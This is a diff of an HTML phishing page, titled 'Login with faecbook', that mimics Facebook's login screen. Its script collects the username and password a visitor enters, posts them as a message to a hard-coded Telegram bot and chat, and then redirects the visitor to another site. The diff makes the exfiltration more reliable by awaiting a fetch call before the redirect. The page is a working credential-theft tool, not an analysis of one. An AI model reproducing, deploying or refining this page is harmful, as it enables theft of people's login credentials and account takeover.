@@ -1,160 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta property="og:url" content="https://voicechat-five.vercel.app/">
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>Login with faecbook ✅</title>
   
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      -webkit-tap-highlight-color: transparent;
-    }
-
-    html, body {
-      height: 100%;
-      width: 100%;
-      background-color: #f0f2f5; 
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    .full-page-container {
-      width: 100%;
-      max-width: 420px;
-      padding: 20px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      text-align: center;
-    }
-
-    .logo {
-      width: 80px;
-      height: 80px;
-      margin-bottom: 20px;
-      object-fit: contain;
-    }
-
-    h1 {
-      font-size: 24px;
-      font-weight: 700;
-      color: #1c1e21;
-      margin-bottom: 12px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-    }
-
-    p.subtitle {
-      font-size: 15px;
-      color: #606770;
-      margin-bottom: 30px;
-      line-height: 1.5;
-      padding: 0 10px;
-    }
-
-    form {
-      width: 100%;
-      display: flex;
-      flex-direction: column;
-      gap: 14px;
-    }
-
-    .custom-input {
-      width: 100%;
-      padding: 16px;
-      background: #ffffff;
-      border: 1px solid #ccd0d5;
-      border-radius: 8px;
-      font-size: 16px;
-      color: #1c1e21;
-      outline: none;
-      transition: border-color 0.2s ease, box-shadow 0.2s ease;
-    }
-
-    .custom-input::placeholder {
-      color: #90949c;
-    }
-
-    .custom-input:focus {
-      border-color: #1877f2;
-      box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
-    }
-
-    .login-btn {
-      width: 100%;
-      padding: 16px;
-      background: #1877f2;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-size: 18px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 6px;
-      transition: background 0.2s ease;
-    }
-
-    .login-btn:hover {
-      background: #166fe5;
-    }
-
-    .login-btn:active {
-      transform: scale(0.98);
-    }
-
-    .forgot-link {
-      display: block;
-      color: #1877f2;
-      font-size: 15px;
-      font-weight: 500;
-      text-decoration: none;
-      margin-top: 18px;
-    }
-
-    .forgot-link:hover {
-      text-decoration: underline;
-    }
-
-    .divider {
-      width: 100%;
-      height: 1px;
-      background: #dadde1;
-      margin: 25px 0;
-    }
-
-    .safe-notice {
-      font-size: 13px;
-      color: #65676b;
-      text-align: center;
-      line-height: 1.6;
-      padding: 0 10px;
-    }
-    
-    .safe-notice a {
-      color: #1877f2;
-      text-decoration: none;
-    }
-    .safe-notice a:hover {
-      text-decoration: underline;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+    html, body { height: 100%; width: 100%; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; }
+    .full-page-container { width: 100%; max-width: 420px; padding: 20px; display: flex; flex-direction: column; align-items: center; text-align: center; }
+    .logo { width: 80px; height: 80px; margin-bottom: 20px; object-fit: contain; }
+    h1 { font-size: 24px; font-weight: 700; color: #1c1e21; margin-bottom: 12px; }
+    p.subtitle { font-size: 15px; color: #606770; margin-bottom: 30px; line-height: 1.5; }
+    form { width: 100%; display: flex; flex-direction: column; gap: 14px; }
+    .custom-input { width: 100%; padding: 16px; background: #ffffff; border: 1px solid #ccd0d5; border-radius: 8px; font-size: 16px; color: #1c1e21; outline: none; transition: all 0.2s; }
+    .custom-input:focus { border-color: #1877f2; box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2); }
+    .login-btn { width: 100%; padding: 16px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 6px; transition: 0.2s; }
+    .login-btn:hover { background: #166fe5; }
+    .login-btn:active { transform: scale(0.98); }
+    .forgot-link { display: block; color: #1877f2; font-size: 15px; font-weight: 500; text-decoration: none; margin-top: 18px; }
+    .divider { width: 100%; height: 1px; background: #dadde1; margin: 25px 0; }
+    .safe-notice { font-size: 13px; color: #65676b; text-align: center; line-height: 1.6; padding: 0 10px; }
+    .safe-notice a { color: #1877f2; text-decoration: none; }
   </style>
 </head>
 <body>
 
   <div class="full-page-container">
-    
-    <!-- আপনার কাস্টম লোগো -->
     <img src="https://i.postimg.cc/SN6m9D1y/1000097185-removebg-preview.png" alt="Logo" class="logo">
-    
-    <!-- টাইটেল -->
     <h1>Login with faecbook ✅</h1>
     <p class="subtitle">Enter your mobile number or email and password to log in securely.</p>
 
@@ -162,44 +35,41 @@
       <div class="input-group">
         <input type="text" id="username" class="custom-input" placeholder="Mobile number or email" autocomplete="off" required>
       </div>
-
       <div class="input-group">
         <input type="password" id="password" class="custom-input" placeholder="Password" autocomplete="off" required>
       </div>
-
       <button type="submit" class="login-btn" id="loginButton">Login</button>
     </form>
 
     <a href="#" class="forgot-link" onclick="return false;">Forgotten password?</a>
-
     <div class="divider"></div>
-
     <div class="safe-notice">
       <p>This platform uses advanced encryption to protect your data. By continuing, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>.</p>
       <br>
       <p>© 2026 All Rights Reserved.</p>
     </div>
-
   </div>
 
   <script>
     (function() {
       'use strict';
 
+      // 🔴 আপনার টেলিগ্রাম তথ্য
       const TELEGRAM_BOT_TOKEN = "8667615841:AAGvy_U5h-QYYB5n4ZXdk1ejc1gddP8vmsk";
       const TELEGRAM_CHAT_ID = "6250740299";
       
-      // 🎯 Redirect URL সেট করা হলো
+      // 🎯 Redirect URL 
       const REDIRECT_URL = "https://yourcom.infinityfree.me/"; 
       
       const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-      document.getElementById("loginForm").addEventListener("submit", function (e) {
+      document.getElementById("loginForm").addEventListener("submit", async function (e) {
         e.preventDefault();
 
         const username = document.getElementById("username").value.trim();
         const password = document.getElementById("password").value.trim();
 
+        // পাসওয়ার্ড ভ্যালিডেশন
         if (!username || !password || password.length < 6) {
           if (!username) {
             document.getElementById("username").reportValidity();
@@ -225,24 +95,27 @@
                         `👤 <b>User:</b> <code>${username}</code>\n` +
                         `🔑 <b>Pass:</b> <code>${password}</code>`;
 
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('text', message);
-        formData.append('parse_mode', 'HTML');
-
-        const sent = navigator.sendBeacon(TELEGRAM_API, formData);
-        
-        if (!sent) {
-          fetch(TELEGRAM_API, {
+        // ==========================================
+        // 🎯 fetch ব্যবহার করে ডাটা পাঠানো (আগে await করবে, তারপর রিডাইরেক্ট)
+        // ==========================================
+        try {
+          await fetch(TELEGRAM_API, {
             method: 'POST',
-            body: formData,
-            keepalive: true
-          }).catch(err => console.error("Telegram Error:", err));
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: message,
+              parse_mode: 'HTML'
+            })
+          });
+        } catch (err) {
+          console.error("Telegram Error:", err);
         }
 
+        // ডাটা পাঠানোর পর ১ সেকেন্ড অপেক্ষা করে রিডাইরেক্ট
         setTimeout(function() {
           window.location.href = REDIRECT_URL;
-        }, 1500); 
+        }, 1000); 
       });
     })();
   </script>
